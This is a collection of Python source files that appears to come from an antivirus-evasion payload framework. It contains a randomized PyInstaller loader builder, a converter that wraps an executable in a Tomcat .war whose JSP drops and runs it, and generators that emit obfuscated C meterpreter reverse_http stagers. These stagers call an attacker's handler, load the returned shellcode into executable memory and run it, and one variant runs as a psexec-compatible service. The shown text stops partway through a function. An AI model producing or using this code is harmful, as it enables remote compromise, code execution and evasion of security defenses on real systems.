'-lxapofx1_4', '-lxapofx1_5', '-lxapofx', '-lxapofxd1_5', '-lxaudio2_0', '-lxaudio2_1', '-lxaudio2_2', '-lxaudio2_3', '-lxaudio2_4', '-lxaudio2_5', '-lxaudio2_6', '-lxaudio2_7', '-lxaudio', '-lxaudiod2_7', '-lxaudiod', '-lxinput1_1', '-lxinput1_2', '-lxinput1_3', '-lxinput']

    # shuffle up all the libraries
    random.shuffle(fake_libraries)

    # include a random number of the randomized "fake" libraries, between 4-15
    for x in xrange(0, random.randint(5,15)):
        libraries.append(fake_libraries[x])

    # do it all up yo'
    os.system('mkdir build')
    os.system('i686-w64-mingw32-windres -DWIN32 -DWINDOWED -I./modules/common/source/zlib -I./modules/common/source/common -IC:\\\\Python27\\\\include -o ./build/runw.rc.o -i ./modules/common/source/runw.rc')
    os.system('i686-w64-mingw32-gcc -Wdeclaration-after-statement -mms-bitfields -m32 -O2 -fno-strict-aliasing -I./modules/common/source/zlib -I./modules/common/source/common -IC:\\\\Python27\\\\include -DWIN32 -DWINDOWED ./modules/common/source/total.c -c -o ./build/total.o')
    os.system('i686-w64-mingw32-gcc ./build/runw.rc.o ./build/total.o -o runw.exe -Wl,--enable-auto-import -mwindows -Wl,-Bstatic -Lreleasew -LC:\\\\Python27\\\\libs -Wl,-Bstatic -L./modules/common/source/ -lstaticlib_zlib -Wl,-Bdynamic -luser32 -lcomctl32 -lkernel32 -lws2_32 ' + " ".join(libraries))
    os.system('rm -rf build')


def generatePwnstaller():
    """
    Build the randomized source files for Pwnstaller, compile everything
    up, and move the loader to the appropriate Pyinstaller location.
    """

    os.system('clear')

    print "========================================================================="
    print " Pwnstaller | [Version]: %s" %(PWNSTALLER_VERSION) 
    print "========================================================================="
    print " [Web]: http://harmj0y.net/ | [Twitter]: @harmj0y"
    print "========================================================================="
    print "\n"

    print " [*] Generating new runw source files...\n"

    # generate the new source files
    pwnstallerBuildSource()

    print " [*] Compiling a new runw.exe...\n"

    # compile it all up
    pwnstallerCompileRunw()

    print " [*] Pwnstaller generation complete!\n"

    # copy the loader into the correct location
    os.system("mv runw.exe " + settings.PYINSTALLER_PATH + "support/loader/Windows-32bit/")

    print " [*] Pwnstaller runw.exe moved to "+ settings.PYINSTALLER_PATH + "support/loader/Windows-32bit/\n"


########NEW FILE########
__FILENAME__ = coldwar_wrapper
"""

Auxiliary module that takes an executable file (.exe) and converts
it into a .war file, specifically for deploying against Tomcat.

99% of the code came from the metasploit project and their war payload creation techniques

by @christruncer

"""

from modules.common import helpers
from binascii import hexlify
import settings
import zipfile
import random
import string
import os
import sys

class Payload:
    
    def __init__(self):
        # required options
        self.description = "Auxiliary script which converts a .exe file to .war"
        self.language = "python"
        self.rating = "Normal"
        self.extension = "war"
        
        self.required_options = {   "original_exe"  :  ["", "Path to .exe file to convert to .war"],}


    def generate(self):

        # Set up all our variables
        var_hexpath = helpers.randomString()
        var_exepath = helpers.randomString()
        var_data = helpers.randomString()
        var_inputstream = helpers.randomString()
        var_outputstream = helpers.randomString()
        var_numbytes = helpers.randomString()
        var_bytearray = helpers.randomString()
        var_bytes = helpers.randomString()
        var_counter = helpers.randomString()
        var_char1 = helpers.randomString()
        var_char2 = helpers.randomString()
        var_comb = helpers.randomString()
        var_exe = helpers.randomString()
        var_hexfile = helpers.randomString()
        var_proc = helpers.randomString()
        var_name = helpers.randomString()
        var_payload = helpers.randomString()
        random_war_name = helpers.randomString()
        
        # Variables for path to our executable input and war output
        original_exe = self.required_options["original_exe"][0]
        war_file = settings.PAYLOAD_COMPILED_PATH + random_war_name + ".war"
        
        try:
            # read in the executable
            raw = open(original_exe, 'rb').read()
            txt_exe = hexlify(raw)
            txt_payload_file = open(var_hexfile + ".txt", 'w')
            txt_payload_file.write(txt_exe)
            txt_payload_file.close()
        except IOError:
            print helpers.color("\n [!] original_exe file \"" + original_exe + "\" not found\n", warning=True)
            return ""

        # Set up our JSP files used for triggering the payload within the war file
        jsp_payload =  "<%@ page import=\"java.io.*\" %>\n"
        jsp_payload += "<%\n"
        jsp_payload += "String " + var_hexpath + " = application.getRealPath(\"/\") + \"" + var_hexfile + ".txt\";\n"
        jsp_payload += "String " + var_exepath + " = System.getProperty(\"java.io.tmpdir\") + \"/" + var_exe + "\";\n"
        jsp_payload += "String " + var_data + " = \"\";\n"
        jsp_payload += "if (System.getProperty(\"os.name\").toLowerCase().indexOf(\"windows\") != -1){\n"
        jsp_payload += var_exepath + " = " + var_exepath + ".concat(\".exe\");\n"
        jsp_payload += "}\n"
        jsp_payload += "FileInputStream " + var_inputstream + " = new FileInputStream(" + var_hexpath + ");\n"
        jsp_payload += "FileOutputStream " + var_outputstream + " = new FileOutputStream(" + var_exepath + ");\n"
        jsp_payload += "int " + var_numbytes + " = " + var_inputstream + ".available();\n"
        jsp_payload += "byte " + var_bytearray + "[] = new byte[" + var_numbytes + "];\n"
        jsp_payload += var_inputstream + ".read(" + var_bytearray + ");\n"
        jsp_payload += var_inputstream + ".close();\n"
        jsp_payload += "byte[] " + var_bytes + " = new byte[" + var_numbytes + "/2];\n"
        jsp_payload += "for (int " + var_counter + " = 0; " + var_counter + " < " + var_numbytes + "; " + var_counter + " += 2)\n"
        jsp_payload += "{\n"
        jsp_payload += "char " + var_char1 + " = (char) " + var_bytearray + "[" + var_counter + "];\n"
        jsp_payload += "char " + var_char2 + " = (char) " + var_bytearray + "[" + var_counter+ " + 1];\n"
        jsp_payload += "int " + var_comb + " = Character.digit(" + var_char1 + ", 16) & 0xff;\n"
        jsp_payload += var_comb + " <<= 4;\n"
        jsp_payload += var_comb + " += Character.digit(" + var_char2 + ", 16) & 0xff;\n"
        jsp_payload += var_bytes + "[" + var_counter + "/2] = (byte)" + var_comb + ";\n"
        jsp_payload += "}\n"
        jsp_payload += var_outputstream + ".write(" + var_bytes + ");\n"
        jsp_payload += var_outputstream + ".close();\n"
        jsp_payload += "Process " + var_proc + " = Runtime.getRuntime().exec(" + var_exepath + ");\n"
        jsp_payload += "%>\n"
        
        # Write out the jsp code to file
        jsp_file_out = open(var_payload + ".jsp", 'w')
        jsp_file_out.write(jsp_payload)
        jsp_file_out.close()
        
        # MANIFEST.MF file contents, and write it out to disk
        manifest_file = "Manifest-Version: 1.0\r\nCreated-By: 1.6.0_17 (Sun Microsystems Inc.)\r\n\r\n"
        man_file = open("MANIFEST.MF", 'w')
        man_file.write(manifest_file)
        man_file.close()

        # web.xml file contents
        web_xml_contents = "<?xml version=\"1.0\"?>\n"
        web_xml_contents += "<!DOCTYPE web-app PUBLIC\n"
        web_xml_contents += "\"-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN\"\n"
        web_xml_contents += "\"http://java.sun.com/dtd/web-app_2_3.dtd\">\n"
        web_xml_contents += "<web-app>\n"
        web_xml_contents += "<servlet>\n"
        web_xml_contents += "<servlet-name>" + var_name + "</servlet-name>\n"
        web_xml_contents += "<jsp-file>/" + var_payload + ".jsp</jsp-file>\n"
        web_xml_contents += "</servlet>\n"
        web_xml_contents += "</web-app>\n"

        # Write the web.xml file to disk
        xml_file = open("web.xml", 'w')
        xml_file.write(web_xml_contents)
        xml_file.close()

        # Create the directories needed for the war file, and move the needed files into them
        os.system("mkdir META-INF")
        os.system("mkdir WEB-INF")
        os.system("mv web.xml WEB-INF/")
        os.system("mv MANIFEST.MF META-INF/")

        # Make the war file by zipping everything together
        myZipFile = zipfile.ZipFile(war_file, 'w')
        myZipFile.write(var_payload + ".jsp", var_payload + ".jsp", zipfile.ZIP_DEFLATED)
        myZipFile.write(var_hexfile + ".txt", var_hexfile + ".txt", zipfile.ZIP_DEFLATED)
        myZipFile.write("META-INF/MANIFEST.MF", "META-INF/MANIFEST.MF", zipfile.ZIP_DEFLATED)
        myZipFile.write("WEB-INF/web.xml", "WEB-INF/web.xml", zipfile.ZIP_DEFLATED)
        myZipFile.close()

        f = open(war_file, 'r')
        war_payload = f.read()
        f.close()

        # Clean up the individual files, you can always unzip the war to see them again
        os.system("rm -rf WEB-INF")
        os.system("rm -rf META-INF")
        os.system("rm " + var_payload + ".jsp")
        os.system("rm " + var_hexfile + ".txt")
        os.system("rm " + war_file)

        PayloadCode = war_payload

        # Return
        return PayloadCode
########NEW FILE########
__FILENAME__ = pyinstaller_wrapper
"""

Simple auxiliary module that will take a specified python source
file and compile it to an executable using Pyinstaller.

by @harmj0y

"""

from modules.common import helpers
import settings

class Payload:
    
    def __init__(self):
        # required options
        self.description = "Auxiliary pyinstaller wrapper for python source files"
        self.language = "python"
        self.rating = "Normal"
        self.extension = "py"
        
        self.required_options = {   "python_source"  :  ["", "Python source file to compile with pyinstaller"],
                                    "compile_to_exe" :  ["Y", "Compile to an executable"],
                                    "use_pyherion"   :  ["N", "Use the pyherion encrypter"] }


    def generate(self):

        python_source = self.required_options["python_source"][0]
        
        try:
            # read in the python source
            f = open(python_source, 'r')
            PayloadCode = f.read()
            f.close()
        except IOError:
            print helpers.color("\n [!] python_source file \""+python_source+"\" not found\n", warning=True)
            return ""
        
        
        # example of how to check the internal options
        if self.required_options["use_pyherion"][0].lower() == "y":
            PayloadCode = encryption.pyherion(PayloadCode)

        # return everything
        return PayloadCode

########NEW FILE########
__FILENAME__ = rev_http

"""

Obfuscated, pure C windows/meterpreter/reverse_http.

Implements various randomized string processing functions in an
attempt to obfuscate the call tree.
Also compatible with Cobalt-Strike's Beacon.

Original reverse_tcp inspiration from https://github.com/rsmudge/metasploit-loader

Module built by @harmj0y

"""

import random
from modules.common import helpers

class Payload:
    
    def __init__(self):
        # required options
        self.shortname = "meter_rev_http"
        self.description = "pure windows/meterpreter/reverse_http stager, no shellcode"
        self.language = "c"
        self.extension = "c"
        self.rating = "Excellent"
        
        # optional
        # options we require user ineraction for- format is {Option : [Value, Description]]}
        self.required_options = {"LHOST" : ["", "IP of the metasploit handler"],
                                "LPORT" : ["8080", "Port of the metasploit handler"],
                                "compile_to_exe" : ["Y", "Compile to an executable"]}
        
    def generate(self):
        
        sumvalue_name = helpers.randomString()
        checksum_name = helpers.randomString()
        winsock_init_name = helpers.randomString()
        punt_name = helpers.randomString()
        wsconnect_name = helpers.randomString()
        
        # the real includes needed
        includes = [ "#include <stdio.h>" , "#include <stdlib.h>", "#include <windows.h>", "#include <string.h>", "#include <time.h>"]
        
        # max length string for obfuscation
        global_max_string_length = 10000
        max_string_length = random.randint(100,global_max_string_length)
        max_num_strings = 10000
        
        # TODO: add in more string processing functions
        randName1 = helpers.randomString() # reverse()
        randName2 = helpers.randomString() # doubles characters
        stringModFunctions = [  (randName1, "char* %s(const char *t) { int length= strlen(t); int i; char* t2 = (char*)malloc((length+1) * sizeof(char)); for(i=0;i<length;i++) { t2[(length-1)-i]=t[i]; } t2[length] = '\\0'; return t2; }" %(randName1)), 
                                (randName2, "char* %s(char* s){ char *result =  malloc(strlen(s)*2+1); int i; for (i=0; i<strlen(s)*2+1; i++){ result[i] = s[i/2]; result[i+1]=s[i/2];} result[i] = '\\0'; return result; }" %(randName2))
                            ]
                            
        random.shuffle(stringModFunctions)
        
        # obfuscation "logical nop" string generation functions
        randString1 = helpers.randomString(50)
        randName1 = helpers.randomString()
        randVar1 = helpers.randomString()
        randName2 = helpers.randomString()
        randVar2 = helpers.randomString()
        randVar3 = helpers.randomString()
        randName3 = helpers.randomString()
        randVar4 = helpers.randomString()
        randVar5 = helpers.randomString()

        stringGenFunctions = [  (randName1, "char* %s(){ char *%s = %s(\"%s\"); return strstr( %s, \"%s\" );}" %(randName1, randVar1, stringModFunctions[0][0], randString1, randVar1, randString1[len(randString1)/2])),
                                (randName2, "char* %s(){ char %s[%s], %s[%s/2]; strcpy(%s,\"%s\"); strcpy(%s,\"%s\"); return %s(strcat( %s, %s)); }" % (randName2, randVar2, max_string_length, randVar3, max_string_length, randVar2, helpers.randomString(50), randVar3, helpers.randomString(50), stringModFunctions[1][0], randVar2, randVar3)),
                                (randName3, "char* %s() { char %s[%s] = \"%s\"; char *%s = strupr(%s); return strlwr(%s); }" % (randName3, randVar4, max_string_length, helpers.randomString(50), randVar5, randVar4, randVar5))
                             ]
        random.shuffle(stringGenFunctions)
        
        # obfuscation - add in our fake includes
        fake_includes = ["#include <sys/timeb.h>", "#include <time.h>", "#include <math.h>", "#include <signal.h>", "#include <stdarg.h>", 
                        "#include <limits.h>", "#include <assert.h>"]
        t = random.randint(1,7)
        for x in xrange(1, random.randint(1,7)):
            includes.append(fake_includes[x])
        
        # shuffle up real/fake includes
        random.shuffle(includes)
        
        code = "#define _WIN32_WINNT 0x0500\n"
        code += "#include <winsock2.h>\n"
        code += "\n".join(includes) + "\n"

        #string mod functions
        code += stringModFunctions[0][1] + "\n"
        code += stringModFunctions[1][1] + "\n"

        # build the sumValue function
        string_arg_name = helpers.randomString()
        retval_name = helpers.randomString()
        code += "int %s(char %s[]) {" % (sumvalue_name, string_arg_name)
        code += "int %s=0; int i;" %(retval_name)
        code += "for (i=0; i<strlen(%s);++i) %s += %s[i];" %(string_arg_name, retval_name, string_arg_name)
        code += "return (%s %% 256);}\n" %(retval_name)
        
        # build the winsock_init function
        wVersionRequested_name = helpers.randomString()
        wsaData_name = helpers.randomString()
        code += "void %s() {" % (winsock_init_name)
        code += "WORD %s = MAKEWORD(%s, %s); WSADATA %s;" % (wVersionRequested_name, helpers.obfuscateNum(2,4), helpers.obfuscateNum(2,4), wsaData_name)
        code += "if (WSAStartup(%s, &%s) < 0) { WSACleanup(); exit(1);}}\n" %(wVersionRequested_name,wsaData_name)
        
        # first logical nop string function
        code += stringGenFunctions[0][1] + "\n"
        
        # build punt function
        my_socket_name = helpers.randomString()
        code += "void %s(SOCKET %s) {" %(punt_name, my_socket_name)
        code += "closesocket(%s);" %(my_socket_name)
        code += "WSACleanup();"
        code += "exit(1);}\n"
        
        # second logical nop string function
        code += stringGenFunctions[1][1] + "\n"

        # build the reverse_http uri checksum function
        randchars = ''.join(random.sample("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789",62))
        characters_name = helpers.randomString()
        string_var_name = helpers.randomString()
        code += "char* %s(){" %(checksum_name)
        code += "srand (time(NULL));int i;"
        code += "char %s[] = \"%s\";" %(characters_name, randchars)
        code += "char* %s = malloc(5); %s[4] = 0;" %(string_var_name, string_var_name)
        code += "while (1<2){for(i=0;i<3;++i){%s[i] = %s[rand() %% (sizeof(%s)-1)];}" %(string_var_name, characters_name, characters_name)
        code += "for(i=0;i<sizeof(%s);i++){ %s[3] = %s[i];" % (characters_name, string_var_name, characters_name)
        code += "if (%s(%s) == 92) return %s; } } return 0;}\n" % (sumvalue_name,string_var_name,string_var_name)

        # third logical nop string function
        code += stringGenFunctions[2][1] + "\n"
        
        # build wsconnect function
        target_name = helpers.randomString()
        sock_name = helpers.randomString()
        my_socket_name = helpers.randomString()
        code += "SOCKET %s() { struct hostent * %s; struct sockaddr_in %s; SOCKET %s;" % (wsconnect_name, target_name, sock_name, my_socket_name)
        code += "%s = socket(AF_INET, SOCK_STREAM, 0);" %(my_socket_name)
        code += "if (%s == INVALID_SOCKET) %s(%s);" %(my_socket_name, punt_name, my_socket_name);
        code += "%s = gethostbyname(\"%s\");" %(target_name, self.required_options["LHOST"][0])
        code += "if (%s == NULL) %s(%s);" %(target_name, punt_name, my_socket_name)
        code += "memcpy(&%s.sin_addr.s_addr, %s->h_addr, %s->h_length);" %(sock_name, target_name, target_name)
        code += "%s.sin_family = AF_INET;" %(sock_name)
        code += "%s.sin_port = htons(%s);" %(sock_name, helpers.obfuscateNum(int(self.required_options["LPORT"][0]),32))
        code += "if ( connect(%s, (struct sockaddr *)&%s, sizeof(%s)) ) %s(%s);" %(my_socket_name, sock_name, sock_name, punt_name, my_socket_name)
        code += "return %s;}\n" %(my_socket_name)
        
        # build main() code
        size_name = helpers.randomString()
        buffer_name = helpers.randomString()
        function_name = helpers.randomString()
        my_socket_name = helpers.randomString()
        count_name = helpers.randomString()
        request_buf_name = helpers.randomString()
        buf_counter_name = helpers.randomString()
        bytes_read_name = helpers.randomString()
        
        # obfuscation stuff
        char_array_name_1 = helpers.randomString()
        number_of_strings_1 = random.randint(1,max_num_strings)
        char_array_name_2 = helpers.randomString()
        number_of_strings_2 = random.randint(1,max_num_strings)
        char_array_name_3 = helpers.randomString()
        number_of_strings_3 = random.randint(1,max_num_strings)

        # main method code
        code += "int main(int argc, char * argv[]) {"
        code += "char * %s; int i;" %(buffer_name)

        # obfuscation
        code += "char* %s[%s];" % (char_array_name_1, number_of_strings_1)

        # malloc our first string obfuscation array
        code += "for (i = 0;  i < %s;  ++i) %s[i] = malloc (%s);" %(number_of_strings_1, char_array_name_1, random.randint(max_string_length,global_max_string_length)) 
        
        # call the winsock init function
        code += "%s();" %(winsock_init_name)

        # obfuscation
        code += "char* %s[%s];" % (char_array_name_2, number_of_strings_2)

        # create our socket
        code += "SOCKET %s = %s();" %(my_socket_name,wsconnect_name)
        
        # malloc our second string obfuscation array
        code += "for (i = 0;  i < %s;  ++i) %s[i] = malloc (%s);" %(number_of_strings_2, char_array_name_2, random.randint(max_string_length,global_max_string_length))
        
        # build and send the HTTP request to the handler
        code += "char %s[200];" %(request_buf_name)
        code += "sprintf(%s, \"GET /%%s HTTP/1.1\\r\\nAccept-Encoding: identity\\r\\nHost: %s:%s\\r\\nConnection: close\\r\\nUser-Agent: Mozilla/4.0 (compatible; MSIE 6.1; Windows NT\\r\\n\\r\\n\", %s());" %(request_buf_name, self.required_options["LHOST"][0], self.required_options["LPORT"][0], checksum_name)
        code += "send(%s,%s, strlen( %s ),0);" %(my_socket_name, request_buf_name, request_buf_name)
        code += "Sleep(300);"

        # TODO: obfuscate/randomize the size of the page allocated
        code += "%s = VirtualAlloc(0, 1000000, MEM_COMMIT, PAGE_EXECUTE_READWRITE);" %(buffer_name)
        code += "char* %s[%s];" % (char_array_name_3, number_of_strings_3)
        
        # first string obfuscation method
        code += "for (i=0; i<%s; ++i){strcpy(%s[i], %s());}" %(number_of_strings_1, char_array_name_1, stringGenFunctions[0][0])
        
        # read the full server response into the buffer
        code += "char * %s = %s;" % (buf_counter_name,buffer_name)
        code += "int %s; do {" % (bytes_read_name)
        code += "%s = recv(%s, %s, 1024, 0);" % (bytes_read_name, my_socket_name, buf_counter_name)
        code += "%s += %s; }" % (buf_counter_name,bytes_read_name)
        code += "while ( %s > 0 );" % (bytes_read_name)

        # malloc our third string obfuscation array
        code += "for (i = 0;  i < %s;  ++i) %s[i] = malloc (%s);" %(number_of_strings_3, char_array_name_3, random.randint(max_string_length,global_max_string_length))
        
        # second string obfuscation method
        code += "for (i=0; i<%s; ++i){strcpy(%s[i], %s());}" %(number_of_strings_2, char_array_name_2, stringGenFunctions[1][0])
        
        # real code
        code += "closesocket(%s); WSACleanup();" %(my_socket_name)
        code += "((void (*)())strstr(%s, \"\\r\\n\\r\\n\") + 4)();" %(buffer_name)

        # third string obfuscation method (never called)
        code += "for (i=0; i<%s; ++i){strcpy(%s[i], %s());}" %(number_of_strings_3, char_array_name_3, stringGenFunctions[2][0])        
        code += "return 0;}\n"

        return code
    
########NEW FILE########
__FILENAME__ = rev_http_service

"""

Obfuscated, service version of C windows/meterpreter/reverse_http.

Implements various randomized string processing functions in an
attempt to obfuscate the call tree.
Also compatible with Cobalt-Strike's Beacon.

Psexec-compatible.

Original reverse_tcp inspiration from https://github.com/rsmudge/metasploit-loader


Module built by @harmj0y

"""

import random
from modules.common import helpers

class Payload:
    
    def __init__(self):
        # required options
        self.shortname = "meter_rev_http_service"
        self.description = "pure windows/meterpreter/reverse_http windows service stager compatible with psexec, no shellcode"
        self.language = "c"
        self.extension = "c"
        self.rating = "Excellent"
        
        # optional
        # options we require user ineraction for- format is {Option : [Value, Description]]}
        self.required_options = {"LHOST" : ["", "IP of the metasploit handler"],
                                "LPORT" : ["8080", "Port of the metasploit handler"],
                                "compile_to_exe" : ["Y", "Compile to an executable"]}
        
    def generate(self):
        
        sumvalue_name = helpers.randomString()
        checksum_name = helpers.randomString()
        winsock_init_name = helpers.randomString()
        punt_name = helpers.randomString()
        wsconnect_name = helpers.randomString()
        
        # the real includes needed
        includes = [ "#include <stdio.h>" , "#include <stdlib.h>", "#include <windows.h>", "#include <string.h>", "#include <time.h>"]
        
        # max length string for obfuscation
        global_max_string_length = 10000
        max_string_length = random.randint(100,global_max_string_length)
        max_num_strings = 10000
        
        # TODO: add in more string processing functions
        randName1 = helpers.randomString() # reverse()
        randName2 = helpers.randomString() # doubles characters
        stringModFunctions = [  (randName1, "char* %s(const char *t) { int length= strlen(t); int i; char* t2 = (char*)malloc((length+1) * sizeof(char)); for(i=0;i<length;i++) { t2[(length-1)-i]=t[i]; } t2[length] = '\\0'; return t2; }" %(randName1)), 
                                (randName2, "char* %s(char* s){ char *result =  malloc(strlen(s)*2+1); int i; for (i=0; i<strlen(s)*2+1; i++){ result[i] = s[i/2]; result[i+1]=s[i/2];} result[i] = '\\0'; return result; }" %(randName2))
                            ]
                            
        random.shuffle(stringModFunctions)
        
        # obfuscation "logical nop" string generation functions
        randString1 = helpers.randomString(50)
        randName1 = helpers.randomString()
        randVar1 = helpers.randomString()
        randName2 = helpers.randomString()
        randVar2 = helpers.randomString()
        randVar3 = helpers.randomString()
        randName3 = helpers.randomString()
        randVar4 = helpers.randomString()
        randVar5 = helpers.randomString()

        stringGenFunctions = [  (randName1, "char* %s(){ char *%s = %s(\"%s\"); return strstr( %s, \"%s\" );}" %(randName1, randVar1, stringModFunctions[0][0], randString1, randVar1, randString1[len(randString1)/2])),
                                (randName2, "char* %s(){ char %s[%s], %s[%s/2]; strcpy(%s,\"%s\"); strcpy(%s,\"%s\"); return %s(strcat( %s, %s)); }" % (randName2, randVar2, max_string_length, randVar3, max_string_length, randVar2, helpers.randomString(50), randVar3, helpers.randomString(50), stringModFunctions[1][0], randVar2, randVar3)),
                                (randName3, "char* %s() { char %s[%s] = \"%s\"; char *%s = strupr(%s); return strlwr(%s); }" % (randName3, randVar4, max_string_length, helpers.randomString(50), randVar5, randVar4, randVar5))
                             ]
        random.shuffle(stringGenFunctions)
        
        # obfuscation - add in our fake includes
        fake_includes = ["#include <sys/timeb.h>", "#include <time.h>", "#include <math.h>", "#include <signal.h>", "#include <stdarg.h>", 
                        "#include <limits.h>", "#include <assert.h>"]
        t = random.randint(1,7)
        for x in xrange(1, random.randint(1,7)):
            includes.append(fake_includes[x])
        
        # shuffle up real/fake includes
        random.shuffle(includes)
        
        code = "#define _WIN32_WINNT 0x0500\n"
        code += "#include <winsock2.h>\n"
        code += "\n".join(includes) + "\n"

        #real - service related headers (check the stub)
        hStatusName = helpers.randomString()
        serviceHeaders = ["SERVICE_STATUS ServiceStatus;","SERVICE_STATUS_HANDLE %s;" %(hStatusName), "void  ServiceMain(int argc, char** argv);", "void  ControlHandler(DWORD request);"]
        random.shuffle(serviceHeaders)
        
        code += "\n".join(serviceHeaders)

        #string mod functions
        code += stringModFunctions[0][1] + "\n"
        code += stringModFunctions[1][1] + "\n"

        # build the sumValue function
        string_arg_name = helpers.randomString()
        retval_name = helpers.randomString()
        code += "int %s(char %s[]) {" % (sumvalue_name, string_arg_name)
        code += "int %s=0; int i;" %(retval_name)
        code += "for (i=0; i<strlen(%s);++i) %s += %s[i];" %(string_arg_name, retval_name, string_arg_name)
        code += "return (%s %% 256);}\n" %(retval_name)
        
        # build the winsock_init function
        wVersionRequested_name = helpers.randomString()
        wsaData_name = helpers.randomString()
        code += "void %s() {" % (winsock_init_name)
        code += "WORD %s = MAKEWORD(%s, %s); WSADATA %s;" % (wVersionRequested_name, helpers.obfuscateNum(2,4), helpers.obfuscateNum(2,4), wsaData_name)
        code += "if (WSAStartup(%s, &%s) < 0) { WSACleanup(); exit(1);}}\n" %(wVersionRequested_name,wsaData_name)
        
        # first logical nop string function
        code += stringGenFunctions[0][1] + "\n"
        
        # build punt function
        my_socket_name = helpers.randomString()
        code += "void %s(SOCKET %s) {" %(punt_name, my_socket_name)
        code += "closesocket(%s);" %(my_socket_name)
        code += "WSACleanup();"
        code += "exit(1);}\n"
        
        # second logical nop string function
        code += stringGenFunctions[1][1] + "\n"

        # build the reverse_http uri checksum function
        randchars = ''.join(random.sample("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789",62))
        characters_name = helpers.randomString()
        string_var_name = helpers.randomString()
        code += "char* %s(){" %(checksum_name)
        code += "srand (time(NULL));int i;"
        code += "char %s[] = \"%s\";" %(characters_name, randchars)
        code += "char* %s = malloc(5); %s[4] = 0;" %(string_var_name, string_var_name)
        code += "while (1<2){for(i=0;i<3;++i){%s[i] = %s[rand() %% (sizeof(%s)-1)];}" %(string_var_name, characters_name, characters_name)
        code += "for(i=0;i<sizeof(%s);i++){ %s[3] = %s[i];" % (characters_name, string_var_name, characters_name)
        code += "if (%s(%s) == 92) return %s; } } return 0;}\n" % (sumvalue_name,string_var_name,string_var_name)

        # third logical nop string function
        code += stringGenFunctions[2][1] + "\n"
        
        # build wsconnect function
        target_name = helpers.randomString()
        sock_name = helpers.randomString()
        my_socket_name = helpers.randomString()
        code += "SOCKET %s() { struct hostent * %s; struct sockaddr_in %s; SOCKET %s;" % (wsconnect_name, target_name, sock_name, my_socket_name)
        code += "%s = socket(AF_INET, SOCK_STREAM, 0);" %(my_socket_name)
        code += "if (%s == INVALID_SOCKET) %s(%s);" %(my_socket_name, punt_name, my_socket_name);
        code += "%s = gethostbyname(\"%s\");" %(target_name, self.required_options["LHOST"][0])
        code += "if (%s == NULL) %s(%s);" %(target_name, punt_name, my_socket_name)
        code += "memcpy(&%s.sin_addr.s_addr, %s->h_addr, %s->h_length);" %(sock_name, target_name, target_name)
        code += "%s.sin_family = AF_INET;" %(sock_name)
        code += "%s.sin_port = htons(%s);" %(sock_name, helpers.obfuscateNum(int(self.required_options["LPORT"][0]),32))
        code += "if ( connect(%s, (struct sockaddr *)&%s, sizeof(%s)) ) %s(%s);" %(my_socket_name, sock_name, sock_name, punt_name, my_socket_name)
        code += "return %s;}\n" %(my_socket_name)
        

        # real - main() method for the service code
        serviceName = helpers.randomString()
        code += "void main() { SERVICE_TABLE_ENTRY ServiceTable[2];"
        serviceTableEntries = [ "ServiceTable[0].lpServiceName = \"%s\";" %(serviceName), 
                                "ServiceTable[0].lpServiceProc = (LPSERVICE_MAIN_FUNCTION)ServiceMain;",
                                "ServiceTable[1].lpServiceName = NULL;",
                                "ServiceTable[1].lpServiceProc = NULL;"]
        random.shuffle(serviceTableEntries)
        code += "\n".join(serviceTableEntries)
        code += "StartServiceCtrlDispatcher(ServiceTable);}\n"
        

        # real - service status options for us to shuffle
        serviceStatusOptions = ["ServiceStatus.dwWin32ExitCode = 0;",
                                "ServiceStatus.dwCurrentState = SERVICE_START_PENDING;",
                                "ServiceStatus.dwWaitHint = 0;",
                                "ServiceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN;",
                                "ServiceStatus.dwServiceSpecificExitCode = 0;",
                                "ServiceStatus.dwCheckPoint = 0;",
                                "ServiceStatus.dwServiceType = SERVICE_WIN32;"]
        random.shuffle(serviceStatusOptions)
        
        # real - serviceMain() code
        code += "void ServiceMain(int argc, char** argv) {\n"
        code += "\n".join(serviceStatusOptions)
        
        code += "%s = RegisterServiceCtrlHandler( \"%s\", (LPHANDLER_FUNCTION)ControlHandler);" %(hStatusName, serviceName)
        code += "if (%s == (SERVICE_STATUS_HANDLE)0) return;" %(hStatusName)
        code += "ServiceStatus.dwCurrentState = SERVICE_RUNNING;"
        code += "SetServiceStatus (%s, &ServiceStatus);" %(hStatusName)
        
        code += "while (ServiceStatus.dwCurrentState == SERVICE_RUNNING) {\n"

        # build main() code
        size_name = helpers.randomString()
        buffer_name = helpers.randomString()
        function_name = helpers.randomString()
        my_socket_name = helpers.randomString()
        count_name = helpers.randomString()
        request_buf_name = helpers.randomString()
        buf_counter_name = helpers.randomString()
        bytes_read_name = helpers.randomString()
        
        # obfuscation stuff
        char_array_name_1 = helpers.randomString()
        number_of_strings_1 = random.randint(1,max_num_strings)
        char_array_name_2 = helpers.randomString()
        number_of_strings_2 = random.randint(1,max_num_strings)
        char_array_name_3 = helpers.randomString()
        number_of_strings_3 = random.randint(1,max_num_strings)


        code += "char * %s; int i;" %(buffer_name)

        # obfuscation
        code += "char* %s[%s];" % (char_array_name_1, number_of_strings_1)

        # malloc our first string obfuscation array
        code += "for (i = 0;  i < %s;  ++i) %s[i] = malloc (%s);" %(number_of_strings_1, char_array_name_1, random.randint(max_string_length,global_max_string_length)) 
        
        # call the winsock init function
        code += "%s();" %(winsock_init_name)

        # obfuscation
        code += "char* %s[%s];" % (char_array_name_2, number_of_strings_2)

        # create our socket
        code += "SOCKET %s = %s();" %(my_socket_name,wsconnect_name)
        
        # malloc our second string obfuscation array
        code += "for (i = 0;  i < %s;  ++i) %s[i] = malloc (%s);" %(number_of_strings_2, char_array_name_2, random.randint(max_string_length,global_max_string_length))
        
        # build and send the HTTP request to the handler
        code += "char %s[200];" %(request_buf_name)
        code += "sprintf(%s, \"GET /%%s HTTP/1.1\\r\\nAccept-Encoding: identity\\r\\nHost: %s:%s\\r\\nConnection: close\\r\\nUser-Agent: Mozilla/4.0 (compatible; MSIE 6.1; Windows NT\\r\\n\\r\\n\", %s());" %(request_buf_name, self.required_options["LHOST"][0], self.required_options["LPORT"][0], checksum_name)
        code += "send(%s,%s, strlen( %s ),0);" %(my_socket_name, request_buf_name, request_buf_name)
        code += "Sleep(300);"

        # TODO: obfuscate/randomize the size of the page allocated
        code += "%s = VirtualAlloc(0, 1000000, MEM_COMMIT, PAGE_EXECUTE_READWRITE);" %(buffer_name)
